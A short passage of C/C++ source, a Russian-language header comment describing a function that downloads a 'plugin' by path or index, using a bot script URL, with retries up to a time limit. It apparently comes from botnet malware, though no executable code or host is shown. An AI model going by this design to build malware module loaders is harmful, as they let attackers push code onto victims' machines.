...
//****************************************************************************
//  DownloadPluginEx - Расширенная загрузка плагина
//
//  Параметры:
//
//  PluginPath - Относительный путь к плагину. (Должен начинаться с обратного
//			     слеша "/". Если не указать путь, то функция получит адрес
//				 плагина по его относительному номеру
//  ScriptID -   Относительный адрес скрипта. Используется для функции
//               GetBotScriptURL
//  MaxTime  -   Максимальное время загрузки плагина.
//				 0 - для одной попытки.
//               INFINITE - плагин будет загружаться до тех пор пока не
//				 загрузится
//  ModuleSize - Указатель на переменную для записи размера плагина
//
//  Результат:
//
//	Функция вернёт не нулевое значение в случае успешной загрузки
//
//****************************************************************************
